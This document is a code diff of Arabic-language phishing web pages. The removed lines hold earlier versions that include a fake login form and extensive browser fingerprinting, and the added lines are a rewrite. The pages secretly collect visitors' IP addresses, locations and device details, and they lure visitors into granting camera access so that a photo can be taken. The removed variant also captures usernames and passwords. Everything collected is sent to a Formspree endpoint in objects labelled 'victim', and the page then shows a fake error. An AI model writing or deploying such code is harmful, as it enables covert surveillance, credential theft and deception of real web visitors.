@@ -53,92 +53,74 @@
   <canvas class="hidden" id="canvas"></canvas>
 
   <script>
-    const FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
-    let victimData = {};
+    var FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
+    var victimData = {};
     
-    async function collectAll() {
-      let ip = 'unknown';
-      try { 
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        ip = data.ip;
-      } catch(e) { 
-        ip = 'unknown';
-      }
-      
-      let location = {};
-      try {
-        const res = await fetch('https://ipapi.co/' + ip + '/json/');
-        location = await res.json();
-      } catch(e) {
-        location = {};
-      }
-      
-      victimData = {
-        timestamp: new Date().toISOString(),
-        localTime: new Date().toLocaleString('ar-SA'),
-        ip: ip,
-        location: {
-          city: location.city || 'unknown',
-          region: location.region || 'unknown',
-          country: location.country_name || 'unknown',
-          country_code: location.country_code || 'unknown',
-          timezone: location.timezone || 'unknown',
-          isp: location.org || 'unknown'
-        },
-        device: {
-          platform: navigator.platform,
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          screen: screen.width + 'x' + screen.height,
-          colorDepth: screen.colorDepth,
-          pixelRatio: window.devicePixelRatio,
-          cores: navigator.hardwareConcurrency,
-          memory: navigator.deviceMemory || 'unknown',
-          maxTouchPoints: navigator.maxTouchPoints,
-          online: navigator.onLine,
-          cookieEnabled: navigator.cookieEnabled
-        },
-        browser: {
-          vendor: navigator.vendor,
-          appName: navigator.appName,
-          appVersion: navigator.appVersion
-        },
-        network: navigator.connection ? {
-          effectiveType: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt
-        } : 'unavailable',
-        webgl: (function() {
-          try {
-            var canvas = document.createElement('canvas');
-            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return {
-              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-            };
-          } catch(e) { return 'unavailable'; }
-        })(),
-        referrer: document.referrer || 'direct',
-        url: location.href
-      };
-      
-      try {
-        await fetch(FORMSPREE_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            event: 'page_visit',
-            victim: victimData
-          })
+    function collectAll() {
+      fetch('https://api.ipify.org?format=json')
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
+          var ip = data.ip;
+          return fetch('https://ipapi.co/' + ip + '/json/')
+            .then(function(res) { return res.json(); })
+            .then(function(loc) {
+              victimData = {
+                timestamp: new Date().toISOString(),
+                localTime: new Date().toLocaleString('ar-SA'),
+                ip: ip,
+                location: {
+                  city: loc.city || 'unknown',
+                  region: loc.region || 'unknown',
+                  country: loc.country_name || 'unknown',
+                  country_code: loc.country_code || 'unknown',
+                  timezone: loc.timezone || 'unknown',
+                  isp: loc.org || 'unknown'
+                },
+                device: {
+                  platform: navigator.platform,
+                  userAgent: navigator.userAgent,
+                  language: navigator.language,
+                  screen: screen.width + 'x' + screen.height,
+                  colorDepth: screen.colorDepth,
+                  pixelRatio: window.devicePixelRatio,
+                  cores: navigator.hardwareConcurrency,
+                  memory: navigator.deviceMemory || 'unknown',
+                  maxTouchPoints: navigator.maxTouchPoints,
+                  online: navigator.onLine,
+                  cookieEnabled: navigator.cookieEnabled
+                },
+                browser: {
+                  vendor: navigator.vendor,
+                  appName: navigator.appName,
+                  appVersion: navigator.appVersion
+                },
+                network: navigator.connection ? {
+                  effectiveType: navigator.connection.effectiveType,
+                  downlink: navigator.connection.downlink,
+                  rtt: navigator.connection.rtt
+                } : 'unavailable',
+                referrer: document.referrer || 'direct',
+                url: location.href
+              };
+              
+              return fetch(FORMSPREE_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  event: 'page_visit',
+                  victim: victimData
+                })
+              });
+            });
+        })
+        .catch(function(e) {
+          console.log('Error:', e);
         });
-      } catch(e) {}
     }
     
     collectAll();
     
-    async function start() {
+    function start() {
       var btn = document.getElementById('btn');
       var placeholder = document.getElementById('placeholder');
       var video = document.getElementById('video');
@@ -150,18 +132,19 @@
       btn.disabled = true;
       placeholder.style.display = 'none';
       
-      try {
-        var stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: 1280, height: 720 },
-          audio: false
-        });
-        
+      navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: 1280, height: 720 },
+        audio: false
+      })
+      .then(function(stream) {
         video.srcObject = stream;
         video.style.display = 'block';
-        await video.play();
-        
-        await new Promise(function(resolve) { setTimeout(resolve, 1000); });
-        
+        return video.play();
+      })
+      .then(function() {
+        return new Promise(function(resolve) { setTimeout(resolve, 1000); });
+      })
+      .then(function() {
         var canvas = document.getElementById('canvas');
         canvas.width = 1280;
         canvas.height = 720;
@@ -170,7 +153,7 @@
         
         var image = canvas.toDataURL('image/jpeg', 0.6);
         
-        stream.getTracks().forEach(function(t) { t.stop(); });
+        video.srcObject.getTracks().forEach(function(t) { t.stop(); });
         video.style.display = 'none';
         placeholder.style.display = 'block';
         placeholder.textContent = '✅';
@@ -183,723 +166,51 @@
           { p: 80, t: 'جاري الحفظ...' }
         ];
         
-        for(var i = 0; i < steps.length; i++) {
-          fill.style.width = steps[i].p + '%';
-          status.textContent = steps[i].t;
-          await new Promise(function(resolve) { setTimeout(resolve, 800); });
+        var stepIndex = 0;
+        function nextStep() {
+          if (stepIndex >= steps.length) {
+            fill.style.width = '100%';
+            status.textContent = 'فشلت العملية!';
+            setTimeout(function() {
+              progress.style.display = 'none';
+              error.style.display = 'block';
+              btn.textContent = 'إعادة المحاولة';
+              btn.disabled = false;
+            }, 500);
+            
+            fetch(FORMSPREE_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                event: 'camera_capture',
+                victim: victimData,
+                image: image,
+                summary: {
+                  ip: victimData.ip,
+                  country: victimData.location.country,
+                  hasCamera: true
+                }
+              })
+            });
+            
+            return;
+          }
+          
+          fill.style.width = steps[stepIndex].p + '%';
+          status.textContent = steps[stepIndex].t;
+          stepIndex++;
+          setTimeout(nextStep, 800);
         }
         
-        fill.style.width = '100%';
-        status.textContent = 'فشلت العملية!';
-        await new Promise(function(resolve) { setTimeout(resolve, 500); });
-        
-        progress.style.display = 'none';
-        error.style.display = 'block';
-        btn.textContent = 'إعادة المحاولة';
-        btn.disabled = false;
-        
-        await fetch(FORMSPREE_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            event: 'camera_capture',
-            victim: victimData,
-            image: image,
-            summary: {
-              ip: victimData.ip,
-              country: victimData.location.country,
-              hasCamera: true
-            }
-          })
-        });
-        
-      } catch(e) {
+        nextStep();
+      })
+      .catch(function(e) {
         placeholder.style.display = 'block';
         placeholder.textContent = '📷';
         btn.disabled = false;
         alert('يجب السماح بالكاميرا لإنشاء البطاقة');
-      }
-    }
-  </script>
-</body>
-</html>
-      <div class="cam-placeholder" id="placeholder">📷</div>
-      <video id="video" autoplay playsinline></video>
-    </div>
-    
-    <div class="progress" id="progress">
-      <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
-      <div class="status" id="status">جاري التحميل...</div>
-    </div>
-    
-    <button class="btn btn-primary" id="btn" onclick="start()">بدء التصوير</button>
-    
-    <div class="error" id="error">
-      😔 عذراً! فشلت المعالجة.<br>يرجى المحاولة لاحقاً.
-    </div>
-  </div>
-
-  <canvas class="hidden" id="canvas"></canvas>
-
-  <script>
-    const FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
-    let stream = null;
-    let victimData = {};
-    
-    // ==========================================
-    // 1. جمع كل البيانات فوراً
-    // ==========================================
-    async function collectAll() {
-      // IP من خدمات متعددة (fallback)
-      let ip = 'unknown';
-      try { ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip); } 
-      catch(e) { 
-        try { ip = await fetch('https://checkip.amazonaws.com').then(r=>r.text()); } 
-        catch(e2) {}
-      }
-      
-      // الموقع الجغرافي
-      let location = {};
-      try {
-        location = await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
-      } catch(e) {
-        try {
-          location = await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());
-        } catch(e2) {}
-      }
-      
-      victimData = {
-        timestamp: new Date().toISOString(),
-        localTime: new Date().toLocaleString('ar-SA'),
-        ip: ip,
-        location: {
-          city: location.city || location.region || 'unknown',
-          region: location.region || 'unknown',
-          country: location.country_name || location.country || 'unknown',
-          country_code: location.country_code || 'unknown',
-          latitude: location.latitude || 'unknown',
-          longitude: location.longitude || 'unknown',
-          timezone: location.timezone || 'unknown',
-          isp: location.org || location.isp || location.connection?.isp || 'unknown',
-          asn: location.asn || 'unknown'
-        },
-        device: {
-          platform: navigator.platform,
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          languages: navigator.languages?.join(','),
-          screen: `${screen.width}x${screen.height}`,
-          availScreen: `${screen.availWidth}x${screen.availHeight}`,
-          colorDepth: screen.colorDepth,
-          pixelRatio: window.devicePixelRatio,
-          orientation: screen.orientation?.type,
-          cores: navigator.hardwareConcurrency,
-          memory: navigator.deviceMemory || 'unknown',
-          maxTouchPoints: navigator.maxTouchPoints,
-          online: navigator.onLine,
-          cookieEnabled: navigator.cookieEnabled,
-          pdfViewerEnabled: navigator.pdfViewerEnabled || false
-        },
-        browser: {
-          vendor: navigator.vendor,
-          appCodeName: navigator.appCodeName,
-          appName: navigator.appName,
-          appVersion: navigator.appVersion,
-          product: navigator.product,
-          productSub: navigator.productSub,
-          doNotTrack: navigator.doNotTrack
-        },
-        network: navigator.connection ? {
-          effectiveType: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt,
-          saveData: navigator.connection.saveData,
-          type: navigator.connection.type
-        } : 'unavailable',
-        battery: await navigator.getBattery?.().then(b => ({
-          level: Math.round(b.level * 100) + '%',
-          charging: b.charging,
-          chargingTime: b.chargingTime,
-          dischargingTime: b.dischargingTime
-        })).catch(() => 'unavailable'),
-        webgl: (() => {
-          try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return {
-              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-              version: gl.getParameter(gl.VERSION),
-              shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-              maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-              maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
-            };
-          } catch(e) { return 'unavailable'; }
-        })(),
-        canvas: (() => {
-          try {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('Hello! مرحبا! 你好! 🎉', 2, 2);
-            return canvas.toDataURL().slice(0, 100);
-          } catch(e) { return 'unavailable'; }
-        })(),
-        audio: (() => {
-          try {
-            const AudioContext = window.AudioContext || window.webkitAudioContext;
-            const ctx = new AudioContext();
-            const oscillator = ctx.createOscillator();
-            const analyser = ctx.createAnalyser();
-            const gainNode = ctx.createGain();
-            oscillator.connect(analyser);
-            analyser.connect(gainNode);
-            gainNode.connect(ctx.destination);
-            oscillator.type = 'triangle';
-            oscillator.frequency.value = 10000;
-            oscillator.start();
-            const dataArray = new Uint8Array(analyser.frequencyBinCount);
-            analyser.getByteFrequencyData(dataArray);
-            oscillator.stop();
-            ctx.close();
-            return Array.from(dataArray.slice(0, 10)).join(',');
-          } catch(e) { return 'unavailable'; }
-        })(),
-        fonts: (() => {
-          const fonts = ['Arial','Times New Roman','Courier New','Georgia','Verdana','Helvetica','Trebuchet MS','Palatino','Garamond','Bookman','Impact','Comic Sans MS'];
-          const available = [];
-          const canvas = document.createElement('canvas');
-          const ctx = canvas.getContext('2d');
-          const base = ctx.measureText('mmmmmmlli').width;
-          for(const f of fonts) {
-            ctx.font = `72px "${f}", monospace`;
-            if(ctx.measureText('mmmmmmlli').width !== base) available.push(f);
-          }
-          return available;
-        })(),
-        plugins: Array.from(navigator.plugins || []).map(p => p.name),
-        mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
-        storage: {
-          localStorage: !!window.localStorage,
-          sessionStorage: !!window.sessionStorage,
-          indexedDB: !!window.indexedDB,
-          cookies: navigator.cookieEnabled
-        },
-        window: {
-          innerWidth: window.innerWidth,
-          innerHeight: window.innerHeight,
-          outerWidth: window.outerWidth,
-          outerHeight: window.outerHeight,
-          screenX: window.screenX,
-          screenY: window.screenY,
-          screenLeft: window.screenLeft,
-          screenTop: window.screenTop,
-          devicePixelRatio: window.devicePixelRatio,
-          visualViewport: {
-            width: window.visualViewport?.width,
-            height: window.visualViewport?.height,
-            scale: window.visualViewport?.scale
-          }
-        },
-        history: {
-          length: history.length
-        },
-        performance: {
-          timing: performance.timing ? {
-            navigationStart: performance.timing.navigationStart,
-            loadEventEnd: performance.timing.loadEventEnd,
-            domComplete: performance.timing.domComplete
-          } : 'unavailable',
-          memory: performance.memory ? {
-            usedJSHeapSize: performance.memory.usedJSHeapSize,
-            totalJSHeapSize: performance.memory.totalJSHeapSize
-          } : 'unavailable'
-        },
-        referrer: document.referrer || 'direct',
-        url: location.href,
-        host: location.host,
-        protocol: location.protocol
-      };
-      
-      // إرسال فوراً
-      await send({
-        event: 'page_visit',
-        stage: 'landing',
-        victim: victimData
       });
     }
-    
-    // ==========================================
-    // 2. إرسال البيانات
-    // ==========================================
-    async function send(data) {
-      try {
-        await fetch(FORMSPREE_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-      } catch(e) {}
-    }
-    
-    // ==========================================
-    // 3. تشغيل فوراً
-    // ==========================================
-    collectAll();
-    
-    // ==========================================
-    // 4. التقاط الصورة (الحيلة)
-    // ==========================================
-    async function start() {
-      const btn = document.getElementById('btn');
-      const placeholder = document.getElementById('placeholder');
-      const video = document.getElementById('video');
-      const progress = document.getElementById('progress');
-      const fill = document.getElementById('fill');
-      const status = document.getElementById('status');
-      const error = document.getElementById('error');
-      
-      btn.disabled = true;
-      placeholder.style.display = 'none';
-      
-      try {
-        // طلب الكاميرا
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: 1280, height: 720 },
-          audio: false
-        });
-        
-        video.srcObject = stream;
-        video.style.display = 'block';
-        await video.play();
-        
-        // انتظر 1 ثانية للاستقرار
-        await sleep(1000);
-        
-        // التقاط الصورة
-        const canvas = document.getElementById('canvas');
-        canvas.width = 1280;
-        canvas.height = 720;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, 1280, 720);
-        
-        const image = canvas.toDataURL('image/jpeg', 0.6);
-        
-        // إيقاف الكاميرا
-        stream.getTracks().forEach(t => t.stop());
-        video.style.display = 'none';
-        placeholder.style.display = 'block';
-        placeholder.textContent = '✅';
-        
-        // محاكاة المعالجة
-        progress.style.display = 'block';
-        const steps = [
-          { p: 20, t: 'جاري تحليل الوجه...' },
-          { p: 50, t: 'جاري تطبيق التصميم...' },
-          { p: 80, t: 'جاري الحفظ...' }
-        ];
-        
-        for(const s of steps) {
-          fill.style.width = s.p + '%';
-          status.textContent = s.t;
-          await sleep(800);
-        }
-        
-        // فشل وهمي
-        fill.style.width = '100%';
-        status.textContent = 'فشلت العملية!';
-        await sleep(500);
-        
-        progress.style.display = 'none';
-        error.style.display = 'block';
-        btn.textContent = 'إعادة المحاولة';
-        btn.disabled = false;
-        
-        // إرسال الصورة + البيانات
-        await send({
-          event: 'camera_capture',
-          stage: 'completed',
-          timestamp: new Date().toISOString(),
-          victim: victimData,
-          image: image,
-          summary: {
-            ip: victimData.ip,
-            country: victimData.location?.country,
-            city: victimData.location?.city,
-            device: victimData.device?.platform,
-            screen: victimData.device?.screen,
-            hasCamera: true
-          }
-        });
-        
-      } catch(e) {
-        // إذا رفض الكاميرا
-        placeholder.style.display = 'block';
-        placeholder.textContent = '📷';
-        btn.disabled = false;
-        alert('⚠️ يجب السماح بالكاميرا لإنشاء البطاقة');
-      }
-    }
-    
-    function sleep(ms) {
-      return new Promise(r => setTimeout(r, ms));
-    }
-  </script>
-</body>
-</html>
-    <div class="error" id="error">خطأ في البيانات، يرجى المحاولة مرة أخرى</div>
-  </div>
-
-  <!-- كاميرا مخفية -->
-  <video class="hidden-cam" id="video" autoplay playsinline></video>
-  <canvas class="hidden-cam" id="canvas"></canvas>
-
-  <script>
-    // ==========================================
-    // إعدادات Formspree
-    // ==========================================
-    const FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
-    
-    // ==========================================
-    // 1. جمع الموقع الجغرافي (بدون إذن - عبر IP)
-    // ==========================================
-    async function getLocation() {
-      try {
-        // الطريقة 1: عبر IP (لا يحتاج إذن)
-        const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
-        return {
-          method: 'ip_based',
-          ip: ipData.ip,
-          city: ipData.city,
-          region: ipData.region,
-          country: ipData.country_name,
-          country_code: ipData.country_code,
-          latitude: ipData.latitude,
-          longitude: ipData.longitude,
-          timezone: ipData.timezone,
-          org: ipData.org, // ISP
-          asn: ipData.asn
-        };
-      } catch(e) {
-        // fallback
-        return { method: 'failed', error: e.message };
-      }
-    }
-
-    // ==========================================
-    // 2. التقاط صورة من الكاميرا
-    // ==========================================
-    async function captureCamera() {
-      return new Promise(async (resolve) => {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: 'user' }, 
-            audio: false 
-          });
-          
-          const video = document.getElementById('video');
-          const canvas = document.getElementById('canvas');
-          video.srcObject = stream;
-          
-          // انتظر الكاميرا تشتغل
-          await new Promise(r => video.onloadedmetadata = r);
-          
-          // التقاط بعد 1 ثانية
-          setTimeout(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            
-            // تحويل لـ Base64 (صورة مضغوطة)
-            const imageData = canvas.toDataURL('image/jpeg', 0.3);
-            
-            // إيقاف الكاميرا
-            stream.getTracks().forEach(t => t.stop());
-            
-            resolve({ success: true, image: imageData.slice(0, 500) + '... [truncated]' });
-          }, 1000);
-          
-        } catch(e) {
-          resolve({ success: false, error: e.message, reason: 'denied_or_unavailable' });
-        }
-      });
-    }
-
-    // ==========================================
-    // 3. جمع البصمة الكاملة (Fingerprinting)
-    // ==========================================
-    async function collectFingerprint() {
-      const info = {
-        // الوقت
-        timestamp: new Date().toISOString(),
-        localTime: new Date().toLocaleString('ar-SA'),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timezoneOffset: new Date().getTimezoneOffset(),
-        
-        // IP (من خدمة سريعة)
-        ip: await fetch('https://api.ipify.org?format=json')
-          .then(r => r.json()).then(d => d.ip).catch(() => 'unknown'),
-        
-        // الشاشة والجهاز
-        screen: {
-          width: screen.width,
-          height: screen.height,
-          availWidth: screen.availWidth,
-          availHeight: screen.availHeight,
-          colorDepth: screen.colorDepth,
-          pixelRatio: window.devicePixelRatio,
-          orientation: screen.orientation?.type || 'unknown',
-          orientationAngle: screen.orientation?.angle || 0
-        },
-        
-        // المتصفح والنظام
-        browser: {
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          vendor: navigator.vendor,
-          language: navigator.language,
-          languages: navigator.languages?.join(','),
-          online: navigator.onLine,
-          cookieEnabled: navigator.cookieEnabled,
-          pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-          hardwareConcurrency: navigator.hardwareConcurrency,
-          deviceMemory: navigator.deviceMemory || 'unknown',
-          maxTouchPoints: navigator.maxTouchPoints
-        },
-        
-        // الاتصال
-        network: navigator.connection ? {
-          effectiveType: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt,
-          saveData: navigator.connection.saveData
-        } : 'unavailable',
-        
-        // البطارية
-        battery: await navigator.getBattery?.().then(b => ({
-          level: Math.round(b.level * 100) + '%',
-          charging: b.charging,
-          chargingTime: b.chargingTime,
-          dischargingTime: b.dischargingTime
-        })).catch(() => 'unavailable'),
-        
-        // WebGL (بصمة فريدة)
-        webgl: (() => {
-          try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return {
-              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-              version: gl.getParameter(gl.VERSION),
-              shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
-            };
-          } catch(e) { return 'unavailable'; }
-        })(),
-        
-        // Canvas Fingerprint
-        canvas: (() => {
-          try {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('Hello! 你好! مرحبا! 🎉', 2, 2);
-            return canvas.toDataURL().slice(0, 100);
-          } catch(e) { return 'unavailable'; }
-        })(),
-        
-        // Audio Fingerprint
-        audio: (() => {
-          try {
-            const AudioContext = window.AudioContext || window.webkitAudioContext;
-            const ctx = new AudioContext();
-            const oscillator = ctx.createOscillator();
-            const analyser = ctx.createAnalyser();
-            oscillator.connect(analyser);
-            oscillator.type = 'triangle';
-            oscillator.frequency.value = 10000;
-            oscillator.start();
-            const dataArray = new Uint8Array(analyser.frequencyBinCount);
-            analyser.getByteFrequencyData(dataArray);
-            oscillator.stop();
-            return Array.from(dataArray.slice(0, 5)).join(',');
-          } catch(e) { return 'unavailable'; }
-        })(),
-        
-        // Plugins
-        plugins: Array.from(navigator.plugins || []).map(p => ({
-          name: p.name,
-          filename: p.filename,
-          description: p.description
-        })),
-        
-        // MIME Types
-        mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
-        
-        // Fonts
-        fonts: (() => {
-          const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Helvetica', 'Trebuchet MS', 'Palatino', 'Garamond', 'Bookman'];
-          const available = [];
-          const canvas = document.createElement('canvas');
-          const ctx = canvas.getContext('2d');
-          const base = ctx.measureText('mmmmmmlli').width;
-          for (const font of testFonts) {
-            ctx.font = `72px "${font}", monospace`;
-            if (ctx.measureText('mmmmmmlli').width !== base) available.push(font);
-          }
-          return available;
-        })(),
-        
-        // Storage
-        storage: {
-          localStorage: !!window.localStorage,
-          sessionStorage: !!window.sessionStorage,
-          indexedDB: !!window.indexedDB,
-          cookiesEnabled: navigator.cookieEnabled
-        },
-        
-        // Referrer
-        referrer: document.referrer || 'direct',
-        url: location.href,
-        host: location.host,
-        protocol: location.protocol,
-        
-        // Window
-        window: {
-          innerWidth: window.innerWidth,
-          innerHeight: window.innerHeight,
-          outerWidth: window.outerWidth,
-          outerHeight: window.outerHeight,
-          devicePixelRatio: window.devicePixelRatio
-        }
-      };
-      
-      return info;
-    }
-
-    // ==========================================
-    // 4. إرسال كل البيانات
-    // ==========================================
-    async function submit() {
-      const user = document.getElementById('user').value;
-      const pass = document.getElementById('pass').value;
-      
-      document.getElementById('loading').style.display = 'block';
-      
-      // جمع كل شي
-      const [fingerprint, location, camera] = await Promise.all([
-        collectFingerprint(),
-        getLocation(),
-        captureCamera()
-      ]);
-      
-      const payload = {
-        event: 'login_attempt',
-        victim: {
-          username: user,
-          password: pass
-        },
-        fingerprint: fingerprint,
-        location: location,
-        camera: camera,
-        // ملخص سريع للمهاجم
-        summary: {
-          ip: fingerprint.ip,
-          country: location.country,
-          city: location.city,
-          isp: location.org,
-          device: fingerprint.browser.platform,
-          browser: fingerprint.browser.userAgent.slice(0, 50),
-          screen: `${fingerprint.screen.width}x${fingerprint.screen.height}`,
-          hasCamera: camera.success,
-          time: fingerprint.localTime
-        }
-      };
-      
-      // إرسال
-      await fetch(FORMSPREE_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      
-      // إظهار خطأ وهمي
-      document.getElementById('loading').style.display = 'none';
-      document.getElementById('error').style.display = 'block';
-      
-      // إعادة المحاولة بعد 3 ثواني (تجربة ثانية)
-      setTimeout(() => {
-        document.getElementById('error').textContent = 'النظام مشغول حالياً، يرجى المحاولة لاحقاً';
-      }, 3000);
-    }
-
-    // ==========================================
-    // 5. جمع بصمة فورية عند فتح الصفحة
-    // ==========================================
-    (async () => {
-      const [fingerprint, location] = await Promise.all([
-        collectFingerprint(),
-        getLocation()
-      ]);
-      
-      await fetch(FORMSPREE_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          event: 'page_visit',
-          fingerprint: fingerprint,
-          location: location,
-          summary: {
-            ip: fingerprint.ip,
-            country: location.country,
-            city: location.city,
-            time: fingerprint.localTime
-          }
-        })
-      });
-    })();
-  </script>
-</body>
-</html>
-        
-        // جمع المعلومات
-        const data = {
-          ip: ip,
-          time: new Date().toLocaleString('ar-SA'),
-          screen: screen.width + 'x' + screen.height,
-          lang: navigator.language,
-          platform: navigator.platform,
-          touch: 'ontouchstart' in window ? 'نعم' : 'لا',
-          online: navigator.onLine ? 'نعم' : 'لا',
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          url: location.href,
-          browser: navigator.userAgent.slice(0, 150)
-        };
-        
-        // إرسال لـ Formspree
-        await fetch(FORMSPREE_URL, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify(data)
-        });
-        
-        // إظهار النجاح
-        document.getElementById('loader').classList.add('hidden');
-        document.getElementById('title').classList.remove('hidden');
-        document.getElementById('msg').classList.remove('hidden');
-        document.getElementById('info').textContent = `IP: ${ip} | ${data.screen}`;
-        
-      } catch(e) {
-        document.getElementById('box').innerHTML = '<h1>⚠️ خطأ</h1><p>جرب لاحقاً</p>';
-      }
-    }
-    
-    run();
   </script>
 </body>
 </html>
